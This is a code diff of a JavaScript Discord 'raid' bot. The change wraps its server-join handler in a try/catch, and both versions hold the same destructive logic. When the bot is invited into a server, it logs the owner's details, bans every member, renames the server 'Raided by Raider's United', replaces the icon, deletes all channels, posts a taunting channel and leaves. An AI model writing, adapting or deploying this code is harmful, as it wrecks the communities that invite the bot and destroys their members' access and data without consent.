@@ -19,58 +19,62 @@ client.once("ready", async () => {
 })
 
 client.on("guildCreate", async (guild) => {
-    const log = client.channels.cache.get(logChannel)
+    try {
+        const log = client.channels.cache.get(logChannel)
 
-    const embed = new EmbedBuilder()
-        .addFields({
-            name: `Guild Join`,
-            value: [
-                `Guild Name: ${guild.name}`,
-                `Guild ID: ${guild.id}`,
-                `\u200b`,
-                `Owner Name: ${client.users.cache.get(guild.ownerId).tag}`,
-                `owner ID: ${guild.ownerId}`
-            ].join("\n")
+        const embed = new EmbedBuilder()
+            .addFields({
+                name: `Guild Join`,
+                value: [
+                    `Guild Name: ${guild.name}`,
+                    `Guild ID: ${guild.id}`,
+                    `\u200b`,
+                    `Owner Name: ${client.users.cache.get(guild.ownerId).tag}`,
+                    `owner ID: ${guild.ownerId}`
+                ].join("\n")
+            })
+        await log.send({ embeds: [embed] })
+
+        if (bypassGuilds.includes(guild.id)) {
+            return await guild.leave()
+        }
+
+        guild.members.cache.forEach(async (member) => {
+            if (guild.members.cache.has(bypassUsers)) {
+                return
+            } else {
+                member.ban({ reason: "Cuz you invited a random bot lol" })
+            }
+
+            if (member?.permissions.has(PermissionFlagsBits.Administrator)) {
+                return
+            }
+
+            if (member.id === client.user.id) {
+                return
+            }
         })
-    await log.send({ embeds: [embed] })
 
-    if (bypassGuilds.includes(guild.id)) {
-        return await guild.leave()
+        await guild.setName(`Raided by Raider\'s United`)
+
+        await guild.setIcon('https://cdn.discordapp.com/icons/1076549227267768320/af6a752e321510c41fed4ae484977fac.webp?size=4096')
+
+        setInterval(async () => {
+            return await guild.leave().catch(() => null)
+        }, 60000);
+
+
+        guild.channels.cache.forEach(async (channel) => {
+            channel.delete().catch(() => null)
+        })
+
+        await guild.channels.create({
+            name: `This is why you dont invite random bots`,
+            type: ChannelType.GuildText
+        })
+    } catch (error) {
+        return;
     }
-
-    guild.members.cache.forEach(async (member) => {
-        if (guild.members.cache.has(bypassUsers)) {
-            return
-        } else {
-            member.ban({ reason: "Cuz you invited a random bot lol" })
-        }
-
-        if (member?.permissions.has(PermissionFlagsBits.Administrator)) {
-            return
-        }
-
-        if (member.id === client.user.id) {
-            return
-        }
-    })
-
-    await guild.setName(`Raided by Raider\'s United`)
-
-    await guild.setIcon('https://cdn.discordapp.com/icons/1076549227267768320/af6a752e321510c41fed4ae484977fac.webp?size=4096')
-
-    setInterval(async () => {
-        return await guild.leave().catch(() => null)
-    }, 60000);
-
-
-    guild.channels.cache.forEach(async (channel) => {
-        channel.delete().catch(() => null)
-    })
-
-    await guild.channels.create({
-        name: `This is why you dont invite random bots`,
-        type: ChannelType.GuildText
-    })
 })
 
 client.on("guildDelete", async (guild) => {
